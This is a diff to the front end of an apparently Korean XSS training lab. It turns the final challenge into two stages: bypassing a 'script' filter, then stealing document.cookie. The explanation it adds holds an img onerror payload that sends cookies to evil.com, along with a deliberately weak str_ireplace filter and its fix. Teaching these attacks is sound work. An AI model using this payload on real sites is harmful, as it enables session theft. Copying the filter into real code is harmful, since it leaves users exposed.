@@ -51,6 +51,20 @@
   .preview-label{font-size:12.5px; color:var(--muted); margin:14px 0 6px;}
   iframe#preview{width:100%; height:170px; border:1px solid var(--border); border-radius:4px; background:#fff;}
 
+  /* 종합 Challenge 2단계(Stage 1/2) 전용 블록 */
+  .stage-block{border:1px solid var(--border); border-radius:5px; padding:14px; margin-bottom:12px; background:#1f2531;}
+  .stage-head{display:flex; align-items:center; gap:8px; margin-bottom:10px;}
+  .stage-badge{font-family:var(--mono); font-size:11px; font-weight:700; padding:3px 8px; border-radius:10px; border:1px solid var(--border); color:var(--muted);}
+  .stage-badge.done{color:var(--success); border-color:var(--success); background:rgba(79,184,125,0.12);}
+  .stage-badge.doing{color:var(--accent); border-color:var(--accent); background:#241f14;}
+  .stage-title{font-size:13.5px; font-weight:600;}
+  .stage-block input[type=text]{margin-bottom:10px;}
+  .stage-block button.primary{width:100%; margin-bottom:8px;}
+  .miniresult{margin-top:6px; font-size:13.5px; font-family:var(--mono); padding:10px 12px; border-radius:4px; white-space:pre-wrap; display:none;}
+  .miniresult.ok{display:block; background:rgba(79,184,125,0.12); border:1px solid var(--success); color:var(--success);}
+  .miniresult.fail{display:block; background:rgba(226,87,76,0.1); border:1px solid var(--danger); color:#f0a49e;}
+  .miniresult.err{display:block; background:rgba(226,166,60,0.1); border:1px solid var(--accent); color:var(--accent);}
+
   #result{margin-top:14px; font-size:14px; font-family:var(--mono); padding:10px 12px; border-radius:4px; display:none; white-space:pre-wrap;}
   #result.ok{display:block; background:rgba(79,184,125,0.12); border:1px solid var(--success); color:var(--success);}
   #result.fail{display:block; background:rgba(226,87,76,0.1); border:1px solid var(--danger); color:#f0a49e;}
@@ -210,12 +224,12 @@
   <section>
     <h2><span class="dot"></span>실습</h2>
     <div id="fields"></div>
-    <div class="row">
+    <div class="row" id="runRow">
       <button class="primary" id="runBtn"></button>
       <button class="ghost" id="resetBtn">입력창 초기화</button>
       <span class="attempts" id="attemptsLabel"></span>
     </div>
-    <div class="preview-label">렌더링 미리보기 (스크립트는 안전하게 차단된 샌드박스입니다)</div>
+    <div class="preview-label" id="previewLabel">렌더링 미리보기 (스크립트는 안전하게 차단된 샌드박스입니다)</div>
     <iframe id="preview" sandbox="" title="렌더링 미리보기"></iframe>
     <div id="result"></div>
   </section>
@@ -343,17 +357,15 @@ const LEVELS = [
     }
   },
   {
-    id:'challenge', tab:'🧪 Challenge', short:'Challenge', diff:'Final', challenge:true, mode:'stored', actionLabel:'댓글 등록',
-    backend:'/api/xss/challenge',
-    filter:(s)=> s.replace(/script/gi,''),
-    fields:[{key:'c',label:'댓글',ph:'댓글을 입력하세요'}],
-    theoryTitle:'종합 실습 — 힌트 없이 도전',
-    theoryHtml:"<p>지금까지 배운 걸 직접 조합해볼 차례입니다. 이 댓글판에는 <b>script 필터</b>가 걸려 있습니다.</p><p class='note'>목표: 댓글 등록만으로 <b>경고창을 띄우는 스크립트를 실행</b>시키기. 힌트는 제공되지 않습니다.</p>",
+    id:'challenge', tab:'🧪 Challenge', short:'Challenge', diff:'Final', challenge:true, mode:'challenge2stage',
+    fields:[],
+    theoryTitle:'종합 실습 — 2단계 구성',
+    theoryHtml:"<p>이번 Challenge는 한 번에 끝나지 않습니다. <b>Stage 1</b>(script 필터 우회로 스크립트 실행)을 풀어도 FLAG는 안 나오고 \"다음 단계로 가는 힌트\"만 공개됩니다. 그 힌트를 보고 <b>Stage 2</b>(쿠키 탈취 패턴 만들기)까지 풀어야 진짜 FLAG가 나옵니다.</p><p class='note'><b>Stage 1 목표</b>: script 필터가 걸린 댓글판에서 스크립트를 실행시키기.<br><b>Stage 2 목표</b>: Stage 1에서 공개된 힌트를 보고, <code>document.cookie</code> 값을 외부로 전송하는 코드까지 댓글에 넣기.</p><p class='note'>이 레벨은 backend 서버가 켜져 있어야 동작합니다 (시뮬레이션 모드 없음) — backend 폴더에서 <code>node server.js</code>를 먼저 실행하세요.</p>",
     hints:[],
     explain:{
-      why:"script 필터를 우회하면서 동시에 실행 가능한 코드를 만들어야 했습니다 — Lv.3에서 배운 '다른 벡터로 우회하기'를 힌트 없이 스스로 적용한 것입니다.",
-      vuln:"$c = str_ireplace('script','',$_POST['c']);\necho \"<div>$c</div>\";",
-      fixed:"이스케이프를 사용하면 필터링 로직과 무관하게 이런 공격 자체가 원천적으로 통하지 않습니다."
+      why:"Stage 1에서는 Lv.3와 같은 script 블랙리스트 필터 우회 기법(img onerror)을, Stage 2에서는 그 실행된 스크립트로 document.cookie를 외부로 전송하는 실제 공격 패턴을 적용했습니다. '스크립트가 실행된다'는 사실 자체보다, 그걸로 실제 무엇을 훔칠 수 있는지가 XSS의 진짜 위험입니다.",
+      vuln:"// Stage 1\n$c = str_ireplace('script','',$_POST['c']);\necho \"<div>$c</div>\";\n\n// Stage 2 (피해자 브라우저에서 실행됨)\n<img src=x onerror=\"fetch('//evil.com/log?c='+document.cookie)\">",
+      fixed:"이스케이프를 사용하면 필터링 로직과 무관하게 스크립트 실행 자체가 원천적으로 통하지 않아 쿠키 탈취도 불가능합니다. 쿠키에 HttpOnly 속성을 추가하면, XSS가 뚫려도 JavaScript로는 쿠키를 읽을 수 없습니다."
     }
   }
 ];
@@ -361,6 +373,12 @@ const LEVELS = [
 const state = {};
 function getState(id){ return state[id] || (state[id]={attempts:0, unlocked:1, solved:false, comments:[]}); }
 let current = LEVELS[0];
+
+// 종합 Challenge 전용 2단계(Stage 1/2) 진행 상태
+const challengeState = {};
+function getChallengeState(id){
+  return challengeState[id] || (challengeState[id] = {stage1Done:false, stage2Done:false, stage1Hint:'', s1Attempts:0, s2Attempts:0});
+}
 
 const tabsEl = document.getElementById('tabs');
 const theoryTitleEl = document.getElementById('theoryTitle');
@@ -417,14 +435,27 @@ function selectLevel(id){
   theoryTitleEl.textContent = current.theoryTitle;
   theoryBodyEl.innerHTML = current.theoryHtml;
   fieldsEl.innerHTML = '';
-  current.fields.forEach(f=>{
-    const lab = document.createElement('label'); lab.textContent = f.label; lab.setAttribute('for','f_'+f.key);
-    const inp = document.createElement('input'); inp.type='text'; inp.id='f_'+f.key; inp.placeholder=f.ph;
-    inp.autocomplete='off'; inp.spellcheck=false;
-    if (current.mode==='reflected') inp.addEventListener('input', renderPreview);
-    fieldsEl.appendChild(lab); fieldsEl.appendChild(inp);
-  });
-  runBtn.textContent = current.actionLabel;
+
+  const isChallenge2 = current.mode === 'challenge2stage';
+  document.getElementById('runRow').style.display = isChallenge2 ? 'none' : '';
+  document.getElementById('previewLabel').style.display = isChallenge2 ? 'none' : '';
+  previewFrame.style.display = isChallenge2 ? 'none' : '';
+  resultEl.style.display = isChallenge2 ? 'none' : '';
+
+  if (isChallenge2){
+    renderXssChallengeStage();
+  } else {
+    current.fields.forEach(f=>{
+      const lab = document.createElement('label'); lab.textContent = f.label; lab.setAttribute('for','f_'+f.key);
+      const inp = document.createElement('input'); inp.type='text'; inp.id='f_'+f.key; inp.placeholder=f.ph;
+      inp.autocomplete='off'; inp.spellcheck=false;
+      if (current.mode==='reflected') inp.addEventListener('input', renderPreview);
+      fieldsEl.appendChild(lab); fieldsEl.appendChild(inp);
+    });
+    runBtn.textContent = current.actionLabel;
+    renderPreview();
+  }
+
   resultEl.className=''; resultEl.textContent='';
   explainSec.style.display = current.safe ? 'block' : 'none';
   if (current.safe){
@@ -432,12 +463,105 @@ function selectLevel(id){
     explainVuln.textContent = current.explain.vuln;
     explainFixed.textContent = current.explain.fixed;
   }
-  renderPreview();
   renderHints();
   renderTabs();
   const st = getState(current.id);
   attemptsLabel.textContent = '시도 횟수: ' + st.attempts;
   updateProgress();
+}
+
+// ---- 종합 Challenge 전용: Stage 1(필터 우회로 스크립트 실행) → Stage 2(쿠키 탈취 패턴) ----
+function renderXssChallengeStage(){
+  const cs = getChallengeState(current.id);
+  fieldsEl.innerHTML = '';
+
+  const s1 = document.createElement('div');
+  s1.className = 'stage-block';
+  s1.innerHTML = '<div class="stage-head"><span class="stage-badge '+(cs.stage1Done?'done':'doing')+'">'+(cs.stage1Done?'✓ 완료':'STAGE 1')+'</span><span class="stage-title">필터 우회로 스크립트 실행시키기</span></div>';
+
+  if (!cs.stage1Done){
+    const inp = document.createElement('input'); inp.type='text'; inp.id='chComment'; inp.placeholder='댓글 — script 필터를 우회해서 스크립트를 실행시켜보세요'; inp.autocomplete='off'; inp.spellcheck=false;
+    const btn = document.createElement('button'); btn.className='primary'; btn.textContent='Stage 1 댓글 등록';
+    const atLabel = document.createElement('div'); atLabel.className='attempts'; atLabel.textContent='시도 횟수: '+cs.s1Attempts;
+    const resBox = document.createElement('div'); resBox.className='miniresult';
+    btn.addEventListener('click', async ()=>{
+      cs.s1Attempts++;
+      atLabel.textContent = '시도 횟수: '+cs.s1Attempts;
+      resBox.className='miniresult'; resBox.style.display='block'; resBox.textContent='🔄 실제 서버에 요청 중...';
+      try{
+        const res = await fetch('/api/xss/challenge/comments', {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ comment: inp.value })
+        });
+        if (!res.ok) throw new Error('HTTP '+res.status);
+        const data = await res.json();
+        const last = data.comments[data.comments.length-1] || '';
+        if (detectExecuted(last)){
+          cs.stage1Done = true;
+          cs.stage1Hint = '이 실행된 스크립트로 관리자의 세션 쿠키까지 훔쳐내야 진짜 FLAG가 나옵니다. document.cookie 값을 fetch나 img 태그로 외부에 전송하는 코드를 추가해보세요.';
+          renderXssChallengeStage();
+        } else {
+          resBox.className='miniresult fail';
+          resBox.textContent = '댓글은 등록됐지만 필터링되었거나 실행 가능한 패턴이 아닙니다. (실제 서버 응답 기준)';
+        }
+      } catch(e){
+        resBox.className='miniresult err';
+        resBox.textContent = '⚠ 백엔드 서버에 연결할 수 없습니다.\nbackend 폴더에서 "node server.js"를 먼저 실행한 뒤 다시 시도해보세요.';
+      }
+    });
+    s1.appendChild(inp); s1.appendChild(btn); s1.appendChild(atLabel); s1.appendChild(resBox);
+  } else {
+    const hintBox = document.createElement('div');
+    hintBox.className = 'miniresult';
+    hintBox.style.cssText = 'display:block; background:#241f14; border:1px solid var(--accent); color:var(--accent);';
+    hintBox.textContent = '🔓 공개된 힌트: "'+cs.stage1Hint+'"';
+    s1.appendChild(hintBox);
+  }
+  fieldsEl.appendChild(s1);
+
+  const s2 = document.createElement('div');
+  s2.className = 'stage-block';
+  s2.style.marginTop = '14px';
+  if (!cs.stage1Done){
+    s2.style.opacity = '.55';
+    s2.innerHTML = '<div class="stage-head"><span class="stage-badge">STAGE 2</span><span class="stage-title">쿠키 탈취</span></div><p class="locked">🔒 Stage 1을 먼저 통과해야 열립니다.</p>';
+  } else {
+    s2.innerHTML = '<div class="stage-head"><span class="stage-badge '+(cs.stage2Done?'done':'doing')+'">'+(cs.stage2Done?'✓ 완료':'STAGE 2')+'</span><span class="stage-title">쿠키 탈취</span></div>';
+    const inp2 = document.createElement('input'); inp2.type='text'; inp2.id='chSteal'; inp2.placeholder='댓글 — document.cookie를 외부로 전송하는 코드를 넣어보세요'; inp2.autocomplete='off'; inp2.spellcheck=false;
+    const btn2 = document.createElement('button'); btn2.className='primary'; btn2.textContent='Stage 2 댓글 등록';
+    const atLabel2 = document.createElement('div'); atLabel2.className='attempts'; atLabel2.textContent='시도 횟수: '+cs.s2Attempts;
+    const resBox2 = document.createElement('div'); resBox2.className='miniresult';
+    btn2.addEventListener('click', async ()=>{
+      cs.s2Attempts++;
+      atLabel2.textContent = '시도 횟수: '+cs.s2Attempts;
+      resBox2.className='miniresult'; resBox2.style.display='block'; resBox2.textContent='🔄 실제 서버에 요청 중...';
+      try{
+        const res = await fetch('/api/xss/challenge/steal', {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ comment: inp2.value })
+        });
+        if (!res.ok) throw new Error('HTTP '+res.status);
+        const data = await res.json();
+        if (data.stolen){
+          cs.stage2Done = true;
+          getState(current.id).solved = true;
+          resBox2.className='miniresult ok';
+          resBox2.textContent = '🏆 MISSION COMPLETE (실제 백엔드)\n\n✓ Stage 1 필터 우회\n✓ Stage 2 쿠키 탈취 패턴\n\nFLAG: '+data.flag+' — 진짜 서버가 판정한 결과입니다.';
+          showExplain();
+          updateProgress();
+          renderTabs();
+        } else {
+          resBox2.className='miniresult fail';
+          resBox2.textContent = '등록은 됐지만 아직 쿠키를 탈취하는 패턴이 아닙니다 (실제 서버 응답 기준). document.cookie 값을 fetch나 img 태그로 외부로 보내는 코드를 포함해보세요.';
+        }
+      } catch(e){
+        resBox2.className='miniresult err';
+        resBox2.textContent = '⚠ 백엔드 서버에 연결할 수 없습니다.\nbackend 폴더에서 "node server.js"를 먼저 실행한 뒤 다시 시도해보세요.';
+      }
+    });
+    s2.appendChild(inp2); s2.appendChild(btn2); s2.appendChild(atLabel2); s2.appendChild(resBox2);
+  }
+  fieldsEl.appendChild(s2);
 }
 
 function renderHints(){
